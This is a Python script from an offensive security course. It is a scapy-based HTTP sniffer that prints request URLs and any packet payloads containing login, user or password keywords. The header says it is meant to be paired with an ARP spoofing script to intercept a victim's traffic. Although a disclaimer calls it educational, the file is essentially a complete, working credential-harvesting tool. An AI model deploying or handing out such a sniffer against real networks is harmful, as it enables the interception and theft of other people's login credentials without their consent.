#!/usr/bin/env python3

# Author: Cristian Estarellas
# Version: Final version from hack4you
# Year: 2025
# Source: hack4you.io

# This script is the final version with personal modifications from the practice during the course Offensive Python.
# The goal of this script is strictly for educational purposes and should only be used in a controlled environment 
# with proper authorization.

# Disclaimer:
# This script is provided for educational and research purposes only.
# The author assumes no responsibility for any misuse or illegal activities carried out with this script.
# ------------------------------------------------------------------------------------------------------------------

# To use this script is necessary to spoof the victim target. You can use the script spoofer_arp.py.
# With this script we can obtain the information of login. 
# This code is tested in http://www.testphp.vulnweb.com/login.php

# ------------------------------------------------------------------------------------------------------------------

import scapy.all as scapy
import argparse
import signal
import sys

from termcolor import colored
from scapy.layers import http

# Ctrl+C
def def_handler(sig, frame):
    print(colored(f"\n[!] Exit...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Getting arguments: Network interface
def get_argument():
    parser = argparse.ArgumentParser(description="HTTP Sniffer")
    parser.add_argument("-i","--interface", required=True, dest="iface", help="Sniffed Network interfaces")

    args = parser.parse_args()

    return args.iface

# Processing the packet sniffed by scapy
def process_packet(packet):
    cred_keywords = ["login", "user", "pass"]

    if packet.haslayer(http.HTTPRequest):
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"\n[+] URL: {url}", 'blue'))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Possible credentials: {response}", 'green'))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    iface = get_argument()
    sniff(iface)

if __name__ == '__main__':
    main()
